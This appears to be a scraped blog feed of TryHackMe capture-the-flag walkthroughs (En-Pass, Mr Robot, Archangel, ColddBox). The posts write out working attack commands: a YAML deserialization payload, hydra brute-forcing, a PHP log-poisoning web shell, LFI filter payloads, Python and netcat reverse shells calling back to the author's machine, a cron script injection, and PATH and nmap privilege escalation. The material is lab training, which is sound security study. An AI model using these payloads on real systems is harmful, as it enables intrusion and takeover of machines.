-r-------- 1 imsau imsau 3771 Aug 31 2015 .bashrc drwx------ 2 imsau imsau 4096 Jan 31 17:46 .cache -rw-r--r-- 1 imsau imsau 655 Jul 12 2019 .profile drwx------ 2 imsau imsau 4096 Jan 31 16:34 .ssh -r-------- 1 imsau imsau 33 Jan 31 16:34 user.txt lrwxrwxrwx 1 root root 9 Jan 31 19:01 .viminfo -\u0026gt; /dev/null imsau@enpass:~$ cat user.txt | wc -c 33   Privilege Escalation We will use linPEAS script to enumerate the host. Start a python server on your local machine and download the script on the target host.\n1 2  python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...   Do not forget to add execution permission and then run the script.\n1 2 3 4 5 6 7 8 9 10 11 12  wget http://10.9.140.180:8000/linpeas.sh --2021-02-15 18:53:43-- http://10.9.140.180:8000/linpeas.sh Connecting to 10.9.140.180:8000... connected. HTTP request sent, awaiting response... 200 OK Length: 292875 (286K) [text/x-sh] Saving to: ‘linpeas.sh.1’ linpeas.sh.1 100%[===================\u0026gt;] 286.01K 100KB/s in 2.8s 2021-02-15 18:53:46 (100 KB/s) - ‘linpeas.sh.1’ saved [292875/292875] imsau@enpass:~$ chmod +x linpeas.sh imsau@enpass:~$ ./linpeas.sh   Nothing special or interesting was found. Let\u0026rsquo;s do manual enumeration and look inside all the directories we have permission to go in. Starting out with the most used ones, we will find an interesting python script inside the /opt directory.\n1 2 3 4 5  imsau@enpass:/opt/scripts$ ls -la total 12 drwxr-xr-x 2 root root 4096 Jan 31 19:40 . drwxr-xr-x 3 root root 4096 Jan 31 16:34 .. -r-xr-xr-x 1 root root 250 Jan 31 19:40 file.py   The file is owned by root but no cronjob was found. That means, we will not be able to abuse it this way.\n1 2 3 4 5 6 7 8 9 10 11 12  #!/usr/bin/python import yaml class Execute(): def __init__(self,file_name =\u0026#34;/tmp/file.yml\u0026#34;): self.file_name = file_name self.read_file = open(file_name ,\u0026#34;r\u0026#34;) def run(self): return self.read_file.read() data = yaml.load(Execute().run())   Analyzing the source code and searching for yaml, we will find that plain use of yaml.load(input) function is unsafe since the first release and also deprecated.\n PyYAML yaml.load(input) Deprecation\nhttps://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load(input)-Deprecation\n To take advantage of the unsafe load function, we will create file.yml file in the /tmp directory, with the following line inside.\n1  !!python/object/new:os.system \\[\u0026#34;cp /bin/bash /tmp; chmod +s /tmp/bash\u0026#34;\\]   Observe that our file gets deleted.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  imsau@enpass:/opt$ cd /tmp imsau@enpass:/tmp$ ls -la total 28 drwxrwxrwt 7 root root 4096 Feb 15 19:27 . drwxr-xr-x 23 root root 4096 Feb 15 19:23 .. drwxrwxrwt 2 root root 4096 Feb 15 19:22 .font-unix drwxrwxrwt 2 root root 4096 Feb 15 19:22 .ICE-unix drwxrwxrwt 2 root root 4096 Feb 15 19:22 .Test-unix drwxrwxrwt 2 root root 4096 Feb 15 19:22 .X11-unix drwxrwxrwt 2 root root 4096 Feb 15 19:22 .XIM-unix imsau@enpass:/tmp$ touch file.yml imsau@enpass:/tmp$ nano file.yml imsau@enpass:/tmp$ cat file.yml !!python/object/new:os.system [\u0026#34;cp /bin/bash /tmp; chmod +s /tmp/bash\u0026#34;] imsau@enpass:/tmp$ ls -la total 1044 drwxrwxrwt 7 root root 4096 Feb 15 19:28 . drwxr-xr-x 23 root root 4096 Feb 15 19:23 .. -rwsr-sr-x 1 root root 1037528 Feb 15 19:28 bash drwxrwxrwt 2 root root 4096 Feb 15 19:22 .font-unix drwxrwxrwt 2 root root 4096 Feb 15 19:22 .ICE-unix drwxrwxrwt 2 root root 4096 Feb 15 19:22 .Test-unix drwxrwxrwt 2 root root 4096 Feb 15 19:22 .X11-unix drwxrwxrwt 2 root root 4096 Feb 15 19:22 .XIM-unix   When this happen, we will have a SUID bash binary (thanks to the line above) which we are able to run with -p flag to get a root shell.\n1 2 3 4 5 6 7  imsau@enpass:/tmp$ /tmp/bash -p bash-4.3# whoami root bash-4.3# id uid=1002(imsau) gid=1002(imsau) euid=0(root) egid=0(root) groups=0(root),1002(imsau) bash-4.3# cat /root/root.txt | wc -c 32   \rThank you for reading this blog post.\n","description":"Get what you can't.","id":17,"section":"posts","tags":["enumeration","brute force","fuzzing","python","yaml","privilege escalation"],"title":"En-Pass [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/en-pass/"},{"content":"   Title Mr Robot CTF     Info Based on the Mr. Robot show, can you root this box?   Difficulty Medium    Scanning \u0026amp; Enumeration Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  nmap -sV -sC 10.10.43.138 -oN initial.nmap Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-06 11:50 CST Nmap scan report for 10.10.43.138 Host is up (0.076s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp closed ssh 80/tcp open http Apache httpd |_http-server-header: Apache |_http-title: Site doesn\u0026#39;t have a title (text/html). 443/tcp open ssl/http Apache httpd |_http-server-header: Apache |_http-title: Site doesn\u0026#39;t have a title (text/html). | ssl-cert: Subject: commonName=www.example.com | Not valid before: 2015-09-16T10:45:03 |_Not valid after: 2025-09-13T10:45:03   Directory Brute-Forcing 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  gobuster dir -u http://10.10.43.138 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.43.138 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2021/02/06 12:05:27 Starting gobuster =============================================================== /images (Status: 301) /blog (Status: 301) /sitemap (Status: 200) /rss (Status: 301) /login (Status: 302) /0 (Status: 301) /video (Status: 301) /feed (Status: 301) /image (Status: 301) /atom (Status: 301) /wp-content (Status: 301) /admin (Status: 301) /audio (Status: 301) /intro (Status: 200) /wp-login (Status: 200) /css (Status: 301) /rss2 (Status: 301) /license (Status: 200) /wp-includes (Status: 301) /js (Status: 301) /Image (Status: 301) /rdf (Status: 301) /page1 (Status: 301) /readme (Status: 200) /robots (Status: 200) /dashboard (Status: 302) /%20 (Status: 301) Progress: 4512 / 87665 (5.15%)   Let us recall what each HTTP code means:\n 200 OK: Standard response for successful HTTP requests. 301 Moved Permanently : This and all future requests should be directed to the given URL. 302 Found : Tells the client to look at (browse to) another URL, common way of performing URL redirection.  Navigating to /robots.txt reveals the first key and an important file which looks like a username/password dictionary.\n\nWe will download found dictionary by visiting /fsocity.dic and perform sorting and duplicates removing for further faster crawling.\n1 2 3 4 5  cat fsocity.dic | wc -l 858160 sort fsocity.dic | uniq \u0026gt; fsociety.txt cat fsociety.txt | wc -l 11451   The first key can be obtained by navigating to /key-1-of-3.txt\n\nBrute Forcing Wordpress Credentials Let us continue with directories we found earlier with gobuster. Visiting /login reveals Wordpress login form.\n\nWe will intercept post request on the login form with BurpSuite and analyze its content.\n\n\nNext we will use hydra and found dictionary to brute-force the correct username with static password \u0026ldquo;password\u0026rdquo;. Note we have to add error message at the end of our post form.\n1  hydra -L fsocity.dic -p password 10.10.43.138 http-post-form \u0026#34;/wp-login.php:log=^USER^\u0026amp;pwd=^PWD^:Invalid username\u0026#34;   Hydra found a valid username Elliot which we will use in the next step to brute force his password.\n\nOnce again note the error message provided after using an incorrect password.\n\nThis time we will use static username and found dictionary for password brute-force.\nDon\u0026rsquo;t forget to change the error message at the end of our post form.\n1  hydra -l Elliot -P fsocity.dic 10.10.43.138 http-post-form \u0026#34;/wp-login.php:log=^USER^\u0026amp;pwd=^PWD^:The password you entered for the username\u0026#34;   Hydra successfully found Elliot\u0026rsquo;s valid password ER28-0652.\nGaining Access Login in with obtained credentials.\nTheme Exploitation From the previous experiences exploiting Wordpress, we know that we can get a reverse shell through the page editor. Navigate to Appearance -\u0026gt; Editor\n\nWe will choose /archive.php and change its content to php reverse shell\nDon\u0026rsquo;t forget to specify your IP address and desired port. Press Update file button.\nBefore visiting updated php file, don\u0026rsquo;t forget to start a listener on your local machine.\nThen navigate to http://10.10.43.138/wp-content/themes/twentyfifteen/archive.php\nWe successfully gained access as a daemon user.\n1 2 3 4 5 6 7 8 9 10 11  nc -lnvp 53 listening on [any] 53 ... connect to [10.9.140.180] from (UNKNOWN) [10.10.43.138] 43230 Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux 18:38:40 up 52 min, 0 users, load average: 0.07, 2.21, 3.72 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=1(daemon) gid=1(daemon) groups=1(daemon) /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ id uid=1(daemon) gid=1(daemon) groups=1(daemon) $ whoami   Let us start with enumeration and look for other users.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  daemon@linux:/home$ ls -la ls -la total 12 drwxr-xr-x 3 root root 4096 Nov 13 2015 . drwxr-xr-x 22 root root 4096 Sep 16 2015 .. drwxr-xr-x 2 root root 4096 Nov 13 2015 robot daemon@linux:/home$ cd robot cd robot daemon@linux:/home/robot$ ls -la ls -la total 16 drwxr-xr-x 2 root root 4096 Nov 13 2015 . drwxr-xr-x 3 root root 4096 Nov 13 2015 .. -r-------- 1 robot robot 33 Nov 13 2015 key-2-of-3.txt -rw-r--r-- 1 robot robot 39 Nov 13 2015 password.raw-md5 daemon@linux:/home/robot$   We cannot read the second flag but we are able to read the password file.\n1 2 3  daemon@linux:/home/robot$ cat password.raw-md5 cat password.raw-md5 robot:c3fcd3d76192e4007dfb496cca67e13b   Content of the file looks like a backup of robot\u0026rsquo;s user password.\nCopy its content to your local machine and use hash-identifier to identify the hash type.\n1 2 3 4 5 6 7  echo \u0026#34;c3fcd3d76192e4007dfb496cca67e13b\u0026#34; | hash-identifier -------------------------------------------------- HASH: Possible Hashs: [+] MD5 [+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))   Then we will use hashcat to crack robots\u0026rsquo;s password with rockyou wordlist file.\n1 2 3  hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz   We successfully cracked his password.\nSwitch user to robot and read the content of the second key.\n1 2 3 4 5 6 7 8 9 10 11 12 13  daemon@linux:/home/robot$ su robot Password: abcdefghijklmnopqrstuvwxyz robot@linux:~$ cd ~ robot@linux:~$ ls -la total 16 drwxr-xr-x 2 root root 4096 Nov 13 2015 . drwxr-xr-x 3 root root 4096 Nov 13 2015 .. -r-------- 1 robot robot 33 Nov 13 2015 key-2-of-3.txt -rw-r--r-- 1 robot robot 39 Nov 13 2015 password.raw-md5 robot@linux:~$ cat key-2-of-3.txt | wc -c cat key-2-of-3.txt | wc -c 33   Privilege Escalation We will start with checking for any SUID files that we have access to.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  robot@linux:~$ find / -perm -u=s -type f 2\u0026gt;/dev/null find / -perm -u=s -type f 2\u0026gt;/dev/null /bin/ping /bin/umount /bin/mount /bin/ping6 /bin/su /usr/bin/passwd /usr/bin/newgrp /usr/bin/chsh /usr/bin/chfn /usr/bin/gpasswd /usr/bin/sudo /usr/local/bin/nmap /usr/lib/openssh/ssh-keysign /usr/lib/eject/dmcrypt-get-device /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper /usr/lib/pt_chown   From the found ones we are able to escalate privileges with /nmap\nThe interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.\nFirst, we have to check the nmap\u0026rsquo;s version.\n1 2  robot@linux:~$ nmap --version nmap version 3.81   Use \u0026ndash;interactive flag and spawn the shell with !sh command.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  robot@linux:~$ nmap --interactive nmap --interactive Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ ) Welcome to Interactive Mode -- press h \u0026lt;enter\u0026gt; for help nmap\u0026gt; !sh # whoami root # cd /root # ls -la total 32 drwx------ 3 root root 4096 Nov 13 2015 . drwxr-xr-x 22 root root 4096 Sep 16 2015 .. -rw------- 1 root root 4058 Nov 14 2015 .bash_history -rw-r--r-- 1 root root 3274 Sep 16 2015 .bashrc drwx------ 2 root root 4096 Nov 13 2015 .cache -rw-r--r-- 1 root root 0 Nov 13 2015 firstboot_done -r-------- 1 root root 33 Nov 13 2015 key-3-of-3.txt -rw-r--r-- 1 root root 140 Feb 20 2014 .profile -rw------- 1 root root 1024 Sep 16 2015 .rnd # cat key-3-of-3.txt | wc -c cat key-3-of-3.txt | wc -c 33   Verifying we escalate privileges with whoami command gives us root.\nRead the content of the third key.\nCongratulations!\n","description":"Based on the Mr. Robot show, can you root this box?","id":18,"section":"posts","tags":["enumeration","wordpress","hash cracking","privilege escalation"],"title":"Mr Robot CTF [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/mr-robot-ctf/"},{"content":"   Title Archangel     Info Boot2root, Web exploitation, Privilege escalation, LFI   Difficulty Easy    Scanning \u0026amp; Enumeration Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  nmap -A -T4 10.10.226.24 Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-05 01:08 CST Nmap scan report for 10.10.226.24 Host is up (0.077s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA) | 256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA) |_ 256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Wavefire No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).   In the browser navigate to http://{TARGET MACHINE IP}\n\nChange our hosts file (/etc/hosts) to resolve the domain.\n\nNavigating to our newly found domain we get the first flag.\n\nDirectory Brute-Forcing Let us continue with directory brute force.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  gobuster dir -u http://mafialive.thm/ -w /usr/share/dirb/wordlists/common.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://mafialive.thm/ [+] Threads: 10 [+] Wordlist: /usr/share/dirb/wordlists/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2021/02/05 01:18:34 Starting gobuster =============================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /index.html (Status: 200) /robots.txt (Status: 200) /server-status (Status: 403) =============================================================== 2021/02/05 01:19:12 Finished ===============================================================   Nothing interesting is found expect robots.txt\n\n\n\nPressing button reveals directory structure, which may lead to LFI vulnerability.\nLet us test this vulnerability by reading the mrrobot.php file.\nFor more information on LFI PHP Wrappers follow provided link:\nhttps://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601\nhttp://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php\r\n\nAfter decoding mrrobot.php on our local machine we can confirm that LFI vulnerability is present.\n\nAccessing passwd file is not allowed.\nNow we will encode the test.php for further analyses.\nhttp://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php\r\nSave given encoded string into a text file on your local machine and use base64 to deocde it.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  !DOCTYPE HTML\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;INCLUDE\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;Test Page. Not to be Deployed\u0026lt;/h1\u0026gt; \u0026lt;/button\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;/test.php?view=/var/www/html/development_testing/mrrobot.php\u0026#34;\u0026gt;\u0026lt;button id=\u0026#34;secret\u0026#34;\u0026gt;Here is a button\u0026lt;/button\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;br\u0026gt; \u0026lt;?php //FLAG: thm{***************} function containsStr($str, $substr) { return strpos($str, $substr) !== false; } if(isset($_GET[\u0026#34;view\u0026#34;])){ if(!containsStr($_GET[\u0026#39;view\u0026#39;], \u0026#39;../..\u0026#39;) \u0026amp;\u0026amp; containsStr($_GET[\u0026#39;view\u0026#39;], \u0026#39;/var/www/html/development_testing\u0026#39;)) { include $_GET[\u0026#39;view\u0026#39;]; }else{ echo \u0026#39;Sorry, Thats not allowed\u0026#39;; } } ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   Gaining Access Based on the conditions we are no allowed to use \u0026ldquo;../..\u0026rdquo; and we have to start with \u0026ldquo;/var/www/html/development_testing\u0026rdquo;.\nWe can bypass the slash condition with double backslah: ../.. -\u0026gt; ..//..\nLet us test it on the passwd file.\n\nLet us check the apache2 configuration file.\nhttp://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//etc/apache2/envvars\r\nNow we must verify if we have access to these log files.\nhttp://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//var/log/apache2/access.log\r\nGiven output confirmes that we have access to the log files and as an exploit we will use log poisoning:\nhttps://www.hackingarticles.in/apache-log-poisoning-through-lfi/\nTrying to access other useful files doesn\u0026rsquo;t work.\nLog Poisoning Start BurpSuite and intercept your request.\n\nTo achieve our goal, we have to inject cmd comment inside User-Agent by replacing highlighted data. Add cmd comment:\n1  \u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]);?\u0026gt;  Also append \u0026amp;cmd=ls to GET parameter to list all the files in the current working directory.\n\nNext, we will prepare php reverse shell, use python simple server to host our shell file and download it to our target machine.\n1  python3 -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;{LOCAL MACHINE IP}\u0026#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39;   Use CyberChef to URL encode our python reverse shell:\npython3%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.9.140.180%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call(%5B%22/bin/sh%22,%22-i%22%5D);'\r\nBefore sending our request start a netcat listener on your local machine.\n\nSuccessfully we have a shell and also we found the first user flag.\nSystem Enumeration Now we will enumerate target machine with the help of linPEAS. Change directory to /tmp and on your local machine start python server where your linPEAS file is located: python3 -m http.server\nOn target machine download the file with command:\n1  wget {LOCAL MACHINE IP}:8000/linpeas.sh   Make linPEAS file runable with command:\n1  chmod +x linpeas.sh   And run:\n./linpeas.sh\r\n\nEnumeration reveled two interesting files.\nPassword backup file contains only a Youtube link.\nWe will focus on the helloworld.sh\n\n1 2 3 4 5 6  ww-data@ubuntu:/tmp$ cat /opt/helloworld.sh #!/bin/bash echo \u0026#34;hello world\u0026#34; \u0026gt;\u0026gt; /opt/backupfiles/helloworld.txt www-data@ubuntu:/tmp$ cat /home/archangel/myfiles/passwordbackup https://www.youtube.com/watch?v=dQw4w9WgXcQ   Horizontal Privilege Escalation Cronjob Exploitation This file is a cronjob running as user archangel.\nBecause we have a permission to write to this file, we will inject netcat reverse shell into helloworld.sh\nConfirm that netcat is installed:\n1 2  www-data@ubuntu:/opt$ which nc /bin/nc   With the following command we will append our reverse shell at the end of the helloworld.sh.\n1  www-data@ubuntu:/opt$ echo \u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.9.140.180 4444 \u0026gt;/tmp/f\u0026#34; \u0026gt;\u0026gt; helloworld.sh   Now we have to start listener on our local machine and wait for the cronjob.\nThen upgrade received shell with python.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  nc -lnvp 4444 connect to [10.9.140.180] from (UNKNOWN) [10.10.91.247] 60616 /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ id uid=1001(archangel) gid=1001(archangel) groups=1001(archangel) $ whoami archangel $ python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; archangel@ubuntu:~/secret$ ls -la ls -la total 32 drwxrwx--- 2 archangel archangel 4096 Nov 19 20:41 . drwxr-xr-x 6 archangel archangel 4096 Nov 20 15:22 .. -rwsr-xr-x 1 root root 16904 Nov 18 16:40 backup -rw-r--r-- 1 root root 49 Nov 19 20:41 user2.txt archangel@ubuntu:~/secret$ cat user2.txt cat user2.txt thm{*************}   Privilege Escalation Notice that backup file located in the secret directory has SUID file permission which means giving temporary permissions to a user to run a program / file with the permissions of the file owner rather that the user who runs it.\nWe will use strings command to pull strings out of the backup file.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  archangel@ubuntu:~/secret$ strings backup /lib64/ld-linux-x86-64.so.2 setuid system __cxa_finalize setgid __libc_start_main libc.so.6 GLIBC_2.2.5 _ITM_deregisterTMCloneTable __gmon_start__ _ITM_registerTMCloneTable u+UH []A\\A]A^A_ cp /home/user/archangel/myfiles/* /opt/backupfiles . . . . . . . . .   Path Variable Privilege Escalation We can see that cp command does not use the full path, which means that it is vulnerable to Path Variable Privilege Escalation:\nhttps://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/\nTo exploit this vulnerability, we will create our own path and variable for cp command so after backup file execution it will execute the cp located in our path.\nFirst, change directory to tmp, create a file called cp and change permissions to rwx for everybody.\nThen change PATH variable to /tmp and run backup.\nBecause root is the owner, upon execution we escalate privilege.\nGrab the flag!\n1 2 3 4 5 6 7 8 9  archangel@ubuntu:/tmp$ echo \u0026#34;/bin/bash\u0026#34; \u0026gt; cp archangel@ubuntu:/tmp$ chmod 777 cp archangel@ubuntu:/tmp$ export PATH=/tmp:$PATH archangel@ubuntu:/tmp$ ~/secret/backup root@ubuntu:/tmp# id uid=0(root) gid=0(root) groups=0(root),1001(archangel) root@ubuntu:/tmp# cd /root root@ubuntu:/root# cat root.txt thm{*********}   ","description":"Boot2root, Web exploitation, Privilege escalation, LFI","id":19,"section":"posts","tags":["enumeration","decoding","brute force","lfi","log poisoning","exploitation","privilege escalation"],"title":"Archangel [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/archangel/"},{"content":"   Title ColddBox     Info An easy level machine with multiple ways to escalate privileges.   Difficulty Easy    Scanning \u0026amp; Enumeration Nmap 1 2 3 4 5 6 7 8 9 10  nmap -v -p- {TARGET MACHINE IP} Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-10 03:55 CST Completed SYN Stealth Scan at 04:03, 486.51s elapsed (65535 total ports) Nmap scan report for 10.10.145.98 Host is up (0.071s latency). Not shown: 65533 closed ports PORT STATE SERVICE 80/tcp open http 4512/tcp open unknown   Now scan only found open ports 80 and 4512.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  nmap -sV -sC -p 80,4512 {TARGET MACHINE IP} Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-10 04:05 CST Nmap scan report for 10.10.145.98 Host is up (0.072s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-generator: WordPress 4.1.31 |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: ColddBox | One more machine 4512/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA) | 256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA) |_ 256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   \nDirectory Brute-Forcing 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  gobuster dir -u http://{TARGET MACHINE IP} -w /usr/share/wordlists/dirb/big.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.145.98 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/big.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2021/01/10 03:56:57 Starting gobuster =============================================================== /.htaccess (Status: 403) /.htpasswd (Status: 403) /hidden (Status: 301) /server-status (Status: 403) /wp-admin (Status: 301) /wp-content (Status: 301) /wp-includes (Status: 301) =============================================================== 2021/01/10 03:59:37 Finished ===============================================================   \nFrom this message we will note three possible users: C0ldd, Hugo, Philip\nWordpress Enumeration 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119  wpscan --url http://{TARGET MACHINE IP} -e [i] Updating the Database ... [i] Update completed. [+] URL: http://10.10.145.98/ [10.10.145.98] [+] Started: Sun Jan 10 04:07:51 2021 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.18 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://10.10.145.98/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access [+] WordPress readme found: http://10.10.145.98/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://10.10.145.98/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10). | Found By: Rss Generator (Passive Detection) | - http://10.10.145.98/?feed=rss2, \u0026lt;generator\u0026gt;https://wordpress.org/?v=4.1.31\u0026lt;/generator\u0026gt; | - http://10.10.145.98/?feed=comments-rss2, \u0026lt;generator\u0026gt;https://wordpress.org/?v=4.1.31\u0026lt;/generator\u0026gt; [+] WordPress theme in use: twentyfifteen | Location: http://10.10.145.98/wp-content/themes/twentyfifteen/ | Last Updated: 2020-12-09T00:00:00.000Z | Readme: http://10.10.145.98/wp-content/themes/twentyfifteen/readme.txt | [!] The version is out of date, the latest version is 2.8 | Style URL: http://10.10.145.98/wp-content/themes/twentyfifteen/style.css?ver=4.1.31 | Style Name: Twenty Fifteen | Style URI: https://wordpress.org/themes/twentyfifteen | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.0 (80% confidence) | Found By: Style (Passive Detection) | - http://10.10.145.98/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: \u0026#39;Version: 1.0\u0026#39; [+] Enumerating Vulnerable Plugins (via Passive Methods) [i] No plugins Found. [+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:00:05 \u0026lt;======================================\u0026gt; (330 / 330) 100.00% Time: 00:00:05 [+] Checking Theme Versions (via Passive and Aggressive Methods) [i] No themes Found. [+] Enumerating Timthumbs (via Passive and Aggressive Methods) Checking Known Locations - Time: 00:00:40 \u0026lt;====================================\u0026gt; (2575 / 2575) 100.00% Time: 00:00:40 [i] No Timthumbs Found. [+] Enumerating Config Backups (via Passive and Aggressive Methods) Checking Config Backups - Time: 00:00:00 \u0026lt;=========================================\u0026gt; (22 / 22) 100.00% Time: 00:00:00 [i] No Config Backups Found. [+] Enumerating DB Exports (via Passive and Aggressive Methods) Checking DB Exports - Time: 00:00:00 \u0026lt;=============================================\u0026gt; (36 / 36) 100.00% Time: 00:00:00 [i] No DB Exports Found. [+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to \u0026#34;Plain\u0026#34; for those to be detected) Brute Forcing Attachment IDs - Time: 00:00:02 